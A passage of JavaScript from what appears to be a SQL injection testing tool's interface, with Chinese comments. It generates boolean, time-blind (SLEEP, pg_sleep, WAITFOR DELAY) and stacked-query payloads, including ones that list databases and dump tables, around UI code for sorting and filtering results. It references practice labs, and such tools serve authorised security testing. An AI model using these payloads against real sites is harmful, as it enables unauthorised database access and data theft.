    // 切换到注入语法标签页 - 已隐藏，注释掉
    // const syntaxTab = new bootstrap.Tab(document.getElementById('injection-syntax-tab'));
    // syntaxTab.show();
    
    showToast('注入语法生成完成！', 'success');
}

// 生成注入语法
function generateSyntax(url, params) {
    const syntaxList = document.getElementById('syntaxList');
    
    // 清空之前的语法
    syntaxList.innerHTML = '';
    
    // 获取用户选择的时间盲注
    const config = getTestConfig();
    const selectedBlindTechniques = config.blindInjectionTechniques;
    
    // 检查是否选择了时间盲注
    const isTimeBlindSelected = selectedBlindTechniques.some(tech => tech.includes('time_blind'));
    
    // 为每个参数生成语法
    params.forEach(param => {
        // 基本检测语法
        generateBasicSyntax(url, param, syntaxList);
        
        // UNION注入语法
        generateUnionSyntax(url, param, syntaxList);
        
        // 时间盲注语法
        generateTimeSyntax(url, param, syntaxList);
        
        // 堆叠注入语法
        generateStackSyntax(url, param, syntaxList);
        
        // 只有当用户选择了时间盲注时，才为每个参数添加专门的时间盲注测试URL
        if (isTimeBlindSelected) {
            // 直接生成用户期望的时间盲注测试URL格式
            const delay = config.blindInjectionDelay;
            
            // 根据不同的时间盲注类型生成对应的时间盲注URL
            selectedBlindTechniques.forEach(blindTechnique => {
                if (!blindTechnique.includes('time_blind')) return;
                
                let timeFunction;
                switch(blindTechnique) {
                    case 'time_blind_pg':
                        timeFunction = `pg_sleep(${delay})`;
                        break;
                    case 'time_blind_mssql':
                        timeFunction = `IF(1=1) WAITFOR DELAY '0:0:${delay}'`;
                        break;
                    case 'time_blind_mysql':
                    default:
                        timeFunction = `SLEEP(${delay})`;
                        break;
                }
                
                // 针对Less-11示例生成的时间盲注URL
                const timeBlindUrl = `${url}${url.includes('?') ? '&' : '?'}${param.key}=${encodeURIComponent(param.value + `' AND ${timeFunction}`)}`;
                
                // 创建一个专门的语法项，显示用户期望格式的时间盲注URL
                const syntaxItem = document.createElement('div');
                syntaxItem.className = 'syntax-item fade-in syntax-time';
                syntaxItem.dataset.category = 'time';
                syntaxItem.innerHTML = `
                    <div class="syntax-header">
                        <h6 class="syntax-title">时间盲注-用户期望格式-${param.key}-${blindTechnique.replace('time_blind_', '')}</h6>
                        <div class="syntax-actions">
                            <button class="btn btn-primary btn-sm copy-btn" onclick="copyToClipboard('${timeBlindUrl.replace(/'/g, "\\'")}')" title="复制完整URL">
                                <i class="fa fa-link" aria-hidden="true"></i>
                            </button>
                            <button class="btn btn-secondary btn-sm copy-btn" onclick="copyToClipboard('${encodeURIComponent(param.value + `' AND ${timeFunction}`).replace(/'/g, "\\'")}')" title="复制Payload">
                                <i class="fa fa-code" aria-hidden="true"></i>
                            </button>
                            <a href="${timeBlindUrl}" target="_blank" rel="noopener noreferrer" class="btn btn-info btn-sm" title="在新标签页打开">
                                <i class="fa fa-external-link" aria-hidden="true"></i>
                            </a>
                        </div>
                    </div>
                    <div class="syntax-content">
                        <p class="syntax-description">用户期望格式的时间盲注URL，包含${timeFunction.split('(')[0]}函数</p>
                        <div class="syntax-url mt-2">
                            <code>${timeBlindUrl}</code>
                        </div>
                    </div>
                `;
                
                syntaxList.appendChild(syntaxItem);
            });
        }
    });
}

// 表格排序功能
let currentSortColumn = '';
let currentSortDirection = 'asc';

function sortResults(column) {
    const table = document.getElementById('resultsTable');
    const tbody = table.querySelector('tbody');
    const rows = Array.from(tbody.querySelectorAll('tr'));
    
    // 切换排序方向
    if (currentSortColumn === column) {
        currentSortDirection = currentSortDirection === 'asc' ? 'desc' : 'asc';
    } else {
        currentSortColumn = column;
        currentSortDirection = 'asc';
    }
    
    // 更新所有排序图标
    const filterIcons = document.querySelectorAll('.filter-icon');
    filterIcons.forEach(icon => {
        icon.textContent = '▼';
        icon.style.transform = '';
    });
    
    // 更新当前列的排序图标
    const currentIcon = table.querySelector(`th:nth-child(${getColumnIndex(column) + 1}) .filter-icon`);
    if (currentIcon) {
        currentIcon.textContent = '▼';
        if (currentSortDirection === 'desc') {
            currentIcon.style.transform = 'rotate(180deg)';
        }
    }
    
    // 排序行
    rows.sort((a, b) => {
        let aValue, bValue;
        
        // 获取列索引
        const columnIndex = getColumnIndex(column);
        
        // 获取对应列的单元格
        const aCell = a.querySelector(`td:nth-child(${columnIndex + 1})`);
        const bCell = b.querySelector(`td:nth-child(${columnIndex + 1})`);
        
        if (!aCell || !bCell) {
            return 0;
        }
        
        // 获取单元格内容
        const aText = aCell.textContent.trim();
        const bText = bCell.textContent.trim();
        
        // 尝试将内容转换为数字进行比较（适用于数字、状态码、响应时间等）
        const aNum = parseFloat(aText);
        const bNum = parseFloat(bText);
        
        if (!isNaN(aNum) && !isNaN(bNum)) {
            // 数字比较
            aValue = aNum;
            bValue = bNum;
        } else {
            // 字符串比较
            aValue = aText.toLowerCase();
            bValue = bText.toLowerCase();
        }
        
        // 比较值
        if (aValue < bValue) {
            return currentSortDirection === 'asc' ? -1 : 1;
        }
        if (aValue > bValue) {
            return currentSortDirection === 'asc' ? 1 : -1;
        }
        return 0;
    });
    
    // 重新排列行
    rows.forEach(row => tbody.appendChild(row));
}

// 获取列索引
function getColumnIndex(column) {
    const columnMap = {
        'index': 0,
        'url': 1,
        'requestBody': 2,
        'prototype': 3,
        'param': 4,
        'type': 5,
        'commentVariant': 6,
        'spaceReplacement': 7,
        'fieldWrapper': 8,
        'logicOperator': 9,
        'blindTechnique': 10,
        'status': 11,
        'time': 12,
        'length': 13,
        'preview': 14,
        'falsePreview': 15,
        'lengthsMatch': 16,
        'contentsMatch': 17,
        'result': 18,
        'risk': 19
    };
    return columnMap[column] || 0;
}

// 按列筛选表格
function filterTableByColumn(columnIndex, filterValue) {
    // 保存筛选状态
    if (!window.filterState) {
        window.filterState = {};
    }
    window.filterState[columnIndex] = filterValue;
    
    // 更新结果显示，应用筛选条件
    updateResultsDisplay();
}

// 清空所有筛选条件
function clearAllFilters() {
    // 重置筛选状态
    window.filterState = {};
    
    // 清空所有筛选输入框和选择框
    const filterInputs = document.querySelectorAll('.filters-row input, .filters-row select');
    filterInputs.forEach(input => {
        input.value = '';
    });
    
    // 重新应用筛选条件
    filterResults();
}

// 高级筛选功能
let activeFilterDropdown = null;

// 初始化高级筛选
function initAdvancedFilter() {
    const filterIcons = document.querySelectorAll('.filter-icon');
    
    filterIcons.forEach(icon => {
        icon.addEventListener('click', function(e) {
            e.stopPropagation();
            
            // 关闭其他下拉菜单
            if (activeFilterDropdown) {
                activeFilterDropdown.remove();
            }
            
            // 显示当前下拉菜单
            const dropdown = createFilterDropdown(this);
            activeFilterDropdown = dropdown;
            
            // 点击外部关闭
            document.addEventListener('click', function closeDropdown(e) {
                if (!dropdown.contains(e.target) && !icon.contains(e.target)) {
                    dropdown.remove();
                    activeFilterDropdown = null;
                    document.removeEventListener('click', closeDropdown);
                }
            });
        });
    });
}

// 创建筛选下拉菜单
function createFilterDropdown(icon) {
    const columnIndex = parseInt(icon.dataset.column);
    const tableId = icon.dataset.tableId;
    const table = document.getElementById(tableId);
    
    // 获取表格的tbody元素
    const tbody = table.querySelector('tbody');
    
    // 获取该列的所有唯一值
    const uniqueValues = getUniqueValues(table, columnIndex);
    
    // 创建下拉菜单元素
    const dropdown = document.createElement('div');
    dropdown.className = 'filter-dropdown';
    
    // 设置位置
    const rect = icon.getBoundingClientRect();
    dropdown.style.position = 'fixed';
    dropdown.style.left = `${rect.left}px`;
    dropdown.style.top = `${rect.bottom}px`;
    
    // 构建下拉菜单内容
    dropdown.innerHTML = `
        <div class="filter-dropdown-header">筛选条件（${uniqueValues.length}）</div>
        <div class="filter-dropdown-content"></div>
        <div class="filter-dropdown-count" style="padding: 4px 12px; font-size: 0.8rem; color: #6c757d; text-align: right;">
            已选择 <span class="selected-count">0</span> 项
        </div>
        <div class="filter-dropdown-footer">
            <button class="btn btn-sm btn-secondary" onclick="applyFilter(this)">应用</button>
            <button class="btn btn-sm btn-primary" onclick="resetFilter(this)">重置</button>
        </div>
    `;
    
    // 添加筛选选项
    const content = dropdown.querySelector('.filter-dropdown-content');
    const countSpan = dropdown.querySelector('.selected-count');
    
    // 计算每个值出现的次数
    const valueCounts = {};
    // 使用完整的testResults数据集计算值的出现次数
    testResults.forEach(result => {
        const cellValue = getValueFromTestResult(result, columnIndex);
        // 确保值不为空
        if (cellValue !== null && cellValue !== undefined) {
            valueCounts[cellValue] = (valueCounts[cellValue] || 0) + 1;
        }
    });
    
    uniqueValues.forEach(value => {
        const option = document.createElement('div');
        option.className = 'filter-option';
        
        // 构建选项内容，包含值和计数
        const count = valueCounts[value] || 0;
        option.innerHTML = `${value} <span class="filter-count">(${count})</span>`;
        option.dataset.value = value;
        
        // 点击选择/取消选择
        option.addEventListener('click', function() {
            this.classList.toggle('selected');
            
            // 更新已选择项数量
            const selectedOptions = dropdown.querySelectorAll('.filter-option.selected');
            countSpan.textContent = selectedOptions.length;
        });
        
        content.appendChild(option);
    });
    
    // 保存列信息
    dropdown.dataset.columnIndex = columnIndex;
    dropdown.dataset.tableId = tableId;
    
    // 添加到文档
    document.body.appendChild(dropdown);
    
    return dropdown;
}

// 根据列索引从测试结果中获取对应的值
function getValueFromTestResult(result, columnIndex) {
    // 注释变体英文到中文的映射
    const commentVariantMap = {
        'no_comment': '不带注释',
        'double_dash': '双横线注释',
        'double_dash_plus': '双横线+注释',
        'hash': '井号注释',
        'multi_line': '多行注释',
        'inline': '内联注释',
        'double_dash_space': '双重注释'
    };
    
    // 空格替代英文到中文的映射
    const spaceReplacementMap = {
        'none': '无（正常空格）',
        'tab': 'Tab制表符',
        'newline': '换行符',
        'comment': '注释空格',
        'plus': '加号连接'
    };
    
    // 时间盲注英文到中文的映射
    const blindTechniqueMap = {
        'time_blind_mysql': '时间盲注MySQL',
        'time_blind_pg': '时间盲注PostgreSQL',
        'time_blind_mssql': '时间盲注SQLServer'
    };
    
    // 状态徽章映射
    const statusBadges = {
        'positive': '注入点发现',
        'warning': '可疑注入点',
        'negative': '无注入点',
        'error': '测试错误'
    };
    
    // 风险等级映射
    const riskLabels = {
        'high': '高风险',
        'medium': '中风险',
        'low': '低风险'
    };
    
    // 逻辑运算符映射
    const operatorMap = {
        'and': 'AND',
        'or': 'OR',
        'and_double_ampersand': '&&',
        'or_double_pipe': '||',
        'not_equal': '<>',
        'like': 'LIKE',
        'in': 'IN',
        'regexp': 'REGEXP'
    };
    
    // 根据列索引返回对应的值
    switch (columnIndex) {
        case 1: // URL
            return result.testUrl.replace(/\+/g, ' ');
        case 2: // 解码URL
            // 解码URL的逻辑，与displayTestResult函数相同
            let decodedUrl = result.testUrl;
            try {
                const url = new URL(result.testUrl);
                const protocol = url.protocol;
                const host = url.host;
                const pathname = url.pathname;
                let decodedQuery = '';
                const params = new URLSearchParams(url.search);
                let paramIndex = 0;
                for (const [key, value] of params.entries()) {
                    let decodedKey = key;
                    let decodedValue = value;
                    try {
                        decodedKey = customUrlDecode(key);
                        decodedValue = customUrlDecode(value);
                    } catch (e) {
                        // 解码失败，保留原始值
                    }
                    if (paramIndex > 0) {
                        decodedQuery += '&';
                    }
                    decodedQuery += `${decodedKey}=${decodedValue}`;
                    paramIndex++;
                }
                decodedUrl = `${protocol}//${host}${pathname}${decodedQuery ? '?' + decodedQuery : ''}`;
            } catch (e) {
                // 解析失败，使用原始URL
            }
            return decodedUrl;
        case 3: // 请求主体
            if (result.config.requestMethod === 'POST') {
                return result.postData || 'N/A';
            } else {
                try {
                    const url = new URL(result.testUrl);
                    return url.search ? url.search.substring(1) : 'N/A';
                } catch (e) {
                    // 如果URL解析失败，尝试从原始URL中提取查询字符串
                    const queryStartIndex = result.testUrl.indexOf('?');
                    return queryStartIndex !== -1 ? result.testUrl.substring(queryStartIndex + 1) : 'N/A';
                }
            }
        case 4: // 注入原型
            return `${result.param.key}=${result.testCase.payload}`;
        case 5: // 参数名
            return result.param.key;
        case 6: // 注释变体
            {
                let commentVariant = '-';
                // 1. 首先，根据测试用例的payload识别注释变体
                const payload = result.testCase.payload;
                let detectedCommentVariant = 'no_comment';
                
                if (payload.includes(' -- ')) {
                    detectedCommentVariant = 'double_dash';
                } else if (payload.includes(' --+')) {
                    detectedCommentVariant = 'double_dash_plus';
                } else if (payload.includes(' #')) {
                    detectedCommentVariant = 'hash';
                } else if (payload.includes(' /*')) {
                    if (payload.includes('/*!')) {
                        detectedCommentVariant = 'inline';
                    } else {
                        detectedCommentVariant = 'multi_line';
                    }
                }
                
                // 2. 然后，优先使用testCase.commentVariant属性，如果存在的话
                if (result.testCase.commentVariant) {
                    commentVariant = result.testCase.commentVariant;
                }
                
                // 3. 将英文映射为中文
                if (commentVariantMap[commentVariant]) {
                    commentVariant = commentVariantMap[commentVariant];
                } else if (commentVariantMap[detectedCommentVariant]) {
                    commentVariant = commentVariantMap[detectedCommentVariant];
                }
                
                // 4. 处理注释变体测试用例的特殊情况
                if (result.testCase.name.includes('注释变体-')) {
                    commentVariant = result.testCase.commentVariant || result.testCase.name.replace('注释变体-', '');
                }
                
                // 统一显示：将"无"和"-"都改为"不带注释"
                if (commentVariant === '无' || commentVariant === '-') {
                    commentVariant = '不带注释';
                }
                
                return commentVariant;
            }
        case 7: // 空格替代
            {
                let spaceReplacement = result.testCase.spaceReplacement || 'none';
                // 将英文空格替代映射为中文
                spaceReplacement = spaceReplacementMap[spaceReplacement] || spaceReplacement;
                return spaceReplacement;
            }
        case 8: // 字段包裹符
            {
                let fieldWrapper = result.testCase.wrapperType || '-';
                if (result.testCase.name.includes('字段包裹符-')) {
                    fieldWrapper = result.testCase.wrapperType || result.testCase.name.replace('字段包裹符-', '');
                }
                return fieldWrapper;
            }
        case 9: // 逻辑运算符
            {
                let logicOperator = '未知';
                // 优先使用测试用例对象的logicOperator属性
                if (result.testCase.logicOperator) {
                    if (result.testCase.logicOperator === 'none') {
                        logicOperator = '无';
                    } else {
                        logicOperator = operatorMap[result.testCase.logicOperator] || result.testCase.logicOperator || '无';
                    }
                } else {
                    // 从测试用例名称中提取逻辑运算符
                    if (result.testCase.name.includes('AND')) {
                        logicOperator = 'AND';
                    } else if (result.testCase.name.includes('OR')) {
                        logicOperator = 'OR';
                    } else if (result.testCase.name.includes('&&')) {
                        logicOperator = '&&';
                    } else if (result.testCase.name.includes('||')) {
                        logicOperator = '||';
                    } else if (result.testCase.name.includes('不等于')) {
                        logicOperator = '<>';
                    } else if (result.testCase.name.includes('LIKE')) {
                        logicOperator = 'LIKE';
                    } else if (result.testCase.name.includes('IN')) {
                        logicOperator = 'IN';
                    } else if (result.testCase.name.includes('REGEXP')) {
                        logicOperator = 'REGEXP';
                    } else {
                        // 从payload中提取逻辑运算符
                        const payload = result.testCase.payload;
                        if (payload.includes(' AND ')) {
                            logicOperator = 'AND';
                        } else if (payload.includes(' OR ')) {
                            logicOperator = 'OR';
                        } else if (payload.includes(' && ')) {
                            logicOperator = '&&';
                        } else if (payload.includes(' || ')) {
                            logicOperator = '||';
                        } else if (payload.includes(' <> ')) {
                            logicOperator = '<>';
                        } else if (payload.includes(' LIKE ')) {
                            logicOperator = 'LIKE';
                        } else if (payload.includes(' IN ')) {
                            logicOperator = 'IN';
                        } else if (payload.includes(' REGEXP ')) {
                            logicOperator = 'REGEXP';
                        } else {
                            logicOperator = '无';
                        }
                    }
                }
                return logicOperator;
            }
        case 10: // 盲注技术
            {
                let blindTechnique = '无';
                
                // 优先使用测试用例对象本身的blindTechnique属性，并转换为中文
                if (result.testCase.blindTechnique) {
                    blindTechnique = blindTechniqueMap[result.testCase.blindTechnique] || result.testCase.blindTechnique;
                } else if (result.testCase.name.includes('时间盲注MySQL')) {
                    blindTechnique = '时间盲注MySQL';
                } else if (result.testCase.name.includes('时间盲注PostgreSQL')) {
                    blindTechnique = '时间盲注PostgreSQL';
                } else if (result.testCase.name.includes('时间盲注SQLServer')) {
                    blindTechnique = '时间盲注SQLServer';
                } else if (result.testCase.name.includes('time_blind_pg')) {
                    blindTechnique = '时间盲注PostgreSQL';
                } else if (result.testCase.name.includes('time_blind_mssql')) {
                    blindTechnique = '时间盲注SQLServer';
                } else if (result.testCase.name.includes('time_blind')) {
                    blindTechnique = '时间盲注MySQL';
                }
                
                // 确保时间盲注显示为'无'而不是其他默认值
                if (blindTechnique === 'N/A' || blindTechnique === '' || blindTechnique === undefined) {
                    blindTechnique = '无';
                }
                
                return blindTechnique;
            }
        case 11: // 响应状态
            return result.response ? result.response.status : 'N/A';
        case 12: // 响应时间
            return `${result.responseTime}ms`;
        case 13: // 1=2响应时间
            return result.falseResponseTime ? `${result.falseResponseTime}ms` : 'N/A';
        case 14: // Content-Length
            {
                let contentLength = 'N/A';
                if (result.response && result.response.headers) {
                    contentLength = result.response.headers.get('content-length') || result.response.body.length || 'N/A';
                }
                return contentLength;
            }
        case 15: // 响应体预览
            {
                let fullResponseBody = 'N/A';
                if (result.result && result.result.status === 'error') {
                    // 如果1=1测试出现错误，显示错误信息
                    fullResponseBody = result.result.message;
                } else if (result.response && result.response.body) {
                    // 清理HTML标签，只保留纯文本
                    let cleanedBody = result.response.body.replace(/<[^>]*>/g, '');
                    // 移除多余的空白字符
                    cleanedBody = cleanedBody.replace(/\s+/g, ' ').trim();
                    // 保存完整的响应体内容
                    fullResponseBody = cleanedBody;
                    // 如果清理后内容为空，显示提示
                    if (!fullResponseBody || fullResponseBody === '') {
                        fullResponseBody = '空响应体';
                    }
                }
                return fullResponseBody;
            }
        case 16: // 1=2响应体预览
            {
                let falseFullResponseBody = 'N/A';
                if (result.falseResult) {
                    if (result.falseResult.status === 'error') {
                        // 如果1=2测试出现错误，显示错误信息
                        falseFullResponseBody = result.falseResult.message;
                    } else if (result.falseResponse && result.falseResponse.body) {
                        // 清理HTML标签，只保留纯文本
                        let cleanedBody = result.falseResponse.body.replace(/<[^>]*>/g, '');
                        // 移除多余的空白字符
                        cleanedBody = cleanedBody.replace(/\s+/g, ' ').trim();
                        // 保存完整的响应体内容
                        falseFullResponseBody = cleanedBody;
                        // 如果清理后内容为空，显示提示
                        if (!falseFullResponseBody || falseFullResponseBody === '') {
                            falseFullResponseBody = '空响应体';
                        }
                    } else if (result.falseResponse) {
                        // 1=2测试执行了，但响应体为空
                        falseFullResponseBody = '空响应体';
                    } else {
                        // 1=2测试没有执行，显示测试未执行
                        falseFullResponseBody = '测试未执行';
                    }
                } else if (result.falseResponse) {
                    if (result.falseResponse.body) {
                        // 清理HTML标签，只保留纯文本
                        let cleanedBody = result.falseResponse.body.replace(/<[^>]*>/g, '');
                        // 移除多余的空白字符
                        cleanedBody = cleanedBody.replace(/\s+/g, ' ').trim();
                        // 保存完整的响应体内容
                        falseFullResponseBody = cleanedBody;
                        // 如果清理后内容为空，显示提示
                        if (!falseFullResponseBody || falseFullResponseBody === '') {
                            falseFullResponseBody = '空响应体';
                        }
                    } else {
                        // 1=2测试执行了，但响应体为空
                        falseFullResponseBody = '空响应体';
                    }
                } else {
                    // 1=2测试没有执行，显示测试未执行
                    falseFullResponseBody = '测试未执行';
                }
                return falseFullResponseBody;
            }
        case 17: // 长度匹配
            return result.lengthsMatch ? '是' : '否';
        case 18: // 内容匹配
            return result.contentsMatch ? '是' : '否';
        case 19: // 结果状态
            return statusBadges[result.result.status] || '';
        case 20: // 风险等级
            return riskLabels[result.result.riskLevel] || '';
        default:
            return '';
    }
}

// 获取列的唯一值
function getUniqueValues(table, columnIndex) {
    const values = new Set();
    
    // 使用完整的testResults数据集获取唯一值
    testResults.forEach(result => {
        const value = getValueFromTestResult(result, columnIndex);
        // 允许空值，确保所有唯一值都被包含
        if (value !== null && value !== undefined) {
            values.add(value);
        }
    });
    
    return Array.from(values).sort();
}

// 应用筛选
function applyFilter(btn) {
    const dropdown = btn.closest('.filter-dropdown');
    const columnIndex = parseInt(dropdown.dataset.columnIndex);
    const tableId = dropdown.dataset.tableId;
    
    // 获取选中的选项
    const selectedOptions = dropdown.querySelectorAll('.filter-option.selected');
    const selectedValues = Array.from(selectedOptions).map(opt => opt.dataset.value);
    
    // 初始化筛选状态
    if (!window.filterState) {
        window.filterState = {};
    }
    
    // 保存筛选条件
    if (selectedValues.length > 0) {
        window.filterState[columnIndex] = selectedValues;
    } else {
        delete window.filterState[columnIndex];
    }
    
    // 应用筛选到所有数据并重新显示
    updateResultsDisplay();
    
    // 关闭下拉菜单
    dropdown.remove();
    activeFilterDropdown = null;
}

// 重置筛选
function resetFilter(btn) {
    const dropdown = btn.closest('.filter-dropdown');
    const columnIndex = parseInt(dropdown.dataset.columnIndex);
    
    // 清除该列的筛选条件
    if (window.filterState && window.filterState[columnIndex]) {
        delete window.filterState[columnIndex];
    }
    
    // 如果没有筛选条件了，清空筛选状态
    if (window.filterState && Object.keys(window.filterState).length === 0) {
        window.filterState = null;
    }
    
    // 重新显示所有数据
    updateResultsDisplay();
    
    // 关闭下拉菜单
    dropdown.remove();
    activeFilterDropdown = null;
}

// DOM加载完成后初始化高级筛选
document.addEventListener('DOMContentLoaded', function() {
    // 延迟初始化，确保表格已渲染
    setTimeout(initAdvancedFilter, 1000);
});

// 生成堆叠注入语法
function generateStackSyntax(url, param, syntaxList) {
    const syntaxes = [
        {
            name: '堆叠注入-显示数据库',
            payload: `${param.value}'; show databases; #`,
            description: '使用堆叠注入显示所有数据库',
            category: 'stack'
        },
        {
            name: '堆叠注入-显示表',
            payload: `${param.value}'; use supersqli; show tables; #`,
            description: '切换到supersqli数据库并显示所有表',
            category: 'stack'
        },
        {
            name: '堆叠注入-查询表结构',
            payload: `${param.value}'; use supersqli; desc 表名; #`,
            description: '查看指定表的结构',
            category: 'stack'
        },
        {
            name: '堆叠注入-查询数据',
            payload: `${param.value}'; use supersqli; select * from 表名; #`,
            description: '查询指定表的所有数据',
            category: 'stack'
        },
        {
            name: '堆叠注入-联合查询',
            payload: `${param.value}'; select 1,2; show databases; #`,
            description: '执行联合查询并显示数据库',
            category: 'stack'
        },
        {
            name: '堆叠注入-获取当前用户',
            payload: `${param.value}'; select user(); #`,
            description: '获取当前数据库用户',
            category: 'stack'
        },
        {
            name: '堆叠注入-获取当前数据库',
            payload: `${param.value}'; select database(); #`,
            description: '获取当前使用的数据库',
            category: 'stack'
        }
    ];
    
    syntaxes.forEach(syntax => {
        addSyntaxItem(url, param, syntax, syntaxList);
    });
}

// 生成针对性注入语法
function generateTargetedSyntax(result) {
    // 这里可以根据测试结果生成更具针对性的注入语法
    // 目前简化处理，直接调用通用语法生成
    generateSyntax(result.url, [result.param]);
}

// 新的表格列宽调整功能
function initTableResizableColumns() {
    const table = document.getElementById('resultsTable');
    if (!table) return;
    
    // 确保表格布局为fixed
    table.style.tableLayout = 'fixed';
    
    const thead = table.querySelector('thead');
    const thElements = thead.querySelectorAll('th');
    const cols = table.querySelectorAll('col');
    
    // 移除旧的调整手柄
    const oldResizers = table.querySelectorAll('.resizer');
    oldResizers.forEach(resizer => resizer.remove());
    
    // 状态变量
    let resizing = false;
    let currentColumnIndex = -1;
    let startX = 0;
    let startWidth = 0;
    let minWidth = 50;
    
    // 为每个th添加调整功能
    thElements.forEach((th, index) => {
        // 确保th有相对定位
        th.style.position = 'relative';
        
        // 确保响应体预览(1=1)和响应体预览(1=2)列宽相同
        if (index === 15 || index === 16) {
            const width = 200;
            th.style.width = `${width}px`;
            if (cols[index]) {
                cols[index].width = width;
            }
        }
        
        // 创建新的调整手柄
        const resizer = document.createElement('div');
        resizer.className = 'resizer';
        th.appendChild(resizer);
        
        // 鼠标按下事件
        resizer.addEventListener('mousedown', (e) => {
            e.preventDefault();
            e.stopPropagation();
            
            resizing = true;
            currentColumnIndex = index;
            startX = e.clientX;
            startWidth = th.offsetWidth;
            
            // 防止文本选择
            document.body.style.userSelect = 'none';
            document.body.style.cursor = 'col-resize';
            
            // 添加全局事件监听
            document.addEventListener('mousemove', handleColumnResize);
            document.addEventListener('mouseup', stopColumnResize);
            document.addEventListener('mouseleave', stopColumnResize);
        });
    });
    
    // 调整列宽
    function handleColumnResize(e) {
        if (!resizing) return;
        
        const deltaX = e.clientX - startX;
        const newWidth = Math.max(minWidth, startWidth + deltaX);
        
        // 更新col元素宽度
        if (cols[currentColumnIndex]) {
            cols[currentColumnIndex].width = newWidth;
        }
        
        // 更新所有th和td宽度
        const th = thElements[currentColumnIndex];
        if (th) {
            th.style.width = `${newWidth}px`;
        }
        
        // 如果调整的是响应体预览(1=1)或响应体预览(1=2)，同步调整另一列
        if (currentColumnIndex === 15 || currentColumnIndex === 16) {
            const otherColIndex = currentColumnIndex === 15 ? 16 : 15;
            const otherTh = thElements[otherColIndex];
            if (otherTh) {
                otherTh.style.width = `${newWidth}px`;
            }
            if (cols[otherColIndex]) {
                cols[otherColIndex].width = newWidth;
            }
        }
        
        // 更新所有行的对应列
        const rows = table.querySelectorAll('tbody tr');
        rows.forEach(row => {
            const tds = row.querySelectorAll('td');
            if (tds[currentColumnIndex]) {
                tds[currentColumnIndex].style.width = `${newWidth}px`;
            }
            // 如果是响应体预览列，同步更新另一列的td宽度
            if (currentColumnIndex === 15 || currentColumnIndex === 16) {
                const otherColIndex = currentColumnIndex === 15 ? 16 : 15;
                if (tds[otherColIndex]) {
                    tds[otherColIndex].style.width = `${newWidth}px`;
                }
            }
        });
    }
    
    // 停止调整
    function stopColumnResize() {
        resizing = false;
        currentColumnIndex = -1;
        
        // 恢复正常状态
        document.body.style.userSelect = '';
        document.body.style.cursor = '';
        
        // 移除全局事件监听
        document.removeEventListener('mousemove', handleColumnResize);
        document.removeEventListener('mouseup', stopColumnResize);
        document.removeEventListener('mouseleave', stopColumnResize);
    }
}

// 初始化面板拖拽调整宽度功能
function initPanelResize() {
    const leftPanel = document.getElementById('leftPanel');
    const rightPanel = document.getElementById('rightPanel');
    const resizer = document.getElementById('leftPanelResizer');
    
    if (!leftPanel || !rightPanel || !resizer) return;
    
    let isResizing = false;
    let startX = 0;
    let startLeftWidth = 0;
    let startRightWidth = 0;
    
    // 创建拖拽指示条
    const indicator = document.createElement('div');
    indicator.className = 'panel-resize-indicator';
    document.body.appendChild(indicator);
    
    // 鼠标按下事件
    resizer.addEventListener('mousedown', (e) => {
        e.preventDefault();
        e.stopPropagation();
        
        isResizing = true;
        startX = e.clientX;
        startLeftWidth = leftPanel.offsetWidth;
        startRightWidth = rightPanel.offsetWidth;
        
        // 显示指示条
        indicator.style.display = 'block';
        indicator.style.left = `${leftPanel.getBoundingClientRect().right}px`;
        
        // 添加拖拽状态
        resizer.classList.add('resizing');
        document.body.style.userSelect = 'none';
        document.body.style.cursor = 'col-resize';
        
        // 添加全局事件监听
        document.addEventListener('mousemove', handlePanelMouseMove);
        document.addEventListener('mouseup', handlePanelMouseUp);
        document.addEventListener('mouseleave', handlePanelMouseUp);
    });
    
    // 鼠标移动事件
    function handlePanelMouseMove(e) {
        if (!isResizing) return;
        
        const deltaX = e.clientX - startX;
        const containerWidth = leftPanel.parentElement.offsetWidth;
        const minWidth = 200;
        
        // 计算新的左侧宽度
        let newLeftWidth = startLeftWidth + deltaX;
        
        // 限制最小宽度和最大宽度
        newLeftWidth = Math.max(minWidth, Math.min(newLeftWidth, containerWidth * 0.6));
        
        // 计算新的右侧宽度
        const newRightWidth = containerWidth - newLeftWidth;
        
        // 检查右侧是否满足最小宽度
        if (newRightWidth < minWidth) {
            newLeftWidth = containerWidth - minWidth;
        }
        
        // 更新指示条位置
        indicator.style.left = `${leftPanel.getBoundingClientRect().left + newLeftWidth}px`;
        
        // 更新面板宽度
        const leftPercent = (newLeftWidth / containerWidth) * 100;
        const rightPercent = (newRightWidth / containerWidth) * 100;
        
        leftPanel.style.flex = `0 0 ${leftPercent}%`;
        rightPanel.style.flex = `0 0 ${rightPercent}%`;
    }
    
    // 鼠标释放事件
    function handlePanelMouseUp() {
        if (!isResizing) return;
        
        isResizing = false;
        
        // 隐藏指示条
        indicator.style.display = 'none';
        
        // 移除拖拽状态
        resizer.classList.remove('resizing');
        document.body.style.userSelect = '';
        document.body.style.cursor = '';
        
        // 移除全局事件监听
        document.removeEventListener('mousemove', handlePanelMouseMove);
        document.removeEventListener('mouseup', handlePanelMouseUp);
        document.removeEventListener('mouseleave', handlePanelMouseUp);
    }
}

// 生成基本检测语法
function generateBasicSyntax(url, param, container) {
    const syntaxes = [
        {
            name: '数字型-恒真条件',
            payload: `${param.value} and 1=1`,
            description: '测试数字型注入的恒真条件',
            category: 'basic'
        },
        {
            name: '数字型-恒假条件',
            payload: `${param.value} and 1=2`,
            description: '测试数字型注入的恒假条件',
            category: 'basic'
        },
        {
            name: '字符型-单引号恒真',
            payload: `${param.value}' and '1'='1' -- `,
            description: '测试单引号字符型注入的恒真条件',
            category: 'basic'
        },
        {
            name: '字符型-单引号恒假',
            payload: `${param.value}' and '1'='2' -- `,
            description: '测试单引号字符型注入的恒假条件',
            category: 'basic'
        },
        {
            name: '字符型-双引号恒真',
            payload: `${param.value}" and "1"="1" -- `,
            description: '测试双引号字符型注入的恒真条件',
            category: 'basic'
        },
        {
            name: '字符型-双引号恒假',
            payload: `${param.value}" and "1"="2" -- `,
            description: '测试双引号字符型注入的恒假条件',
            category: 'basic'
        },
        {
            name: '括号型-单引号恒真',
            payload: `${param.value}') and 1=1 -- `,
            description: '测试单引号括号型注入的恒真条件',
            category: 'basic'
        },
        {
            name: '括号型-双引号恒真',
            payload: `${param.value}") and 1=1 -- `,
            description: '测试双引号括号型注入的恒真条件',
            category: 'basic'
        },
        {
            name: '逻辑运算符-AND',
            payload: `${param.value}' AND '1'='1'`,
            description: '测试AND逻辑运算符',
            category: 'basic'
        },
        {
            name: '逻辑运算符-OR',
            payload: `${param.value}' OR '1'='1'`,
            description: '测试OR逻辑运算符',
            category: 'basic'
        },
        {
            name: '逻辑运算符-AND变体(&&)',
            payload: `${param.value}' && '1'='1'`,
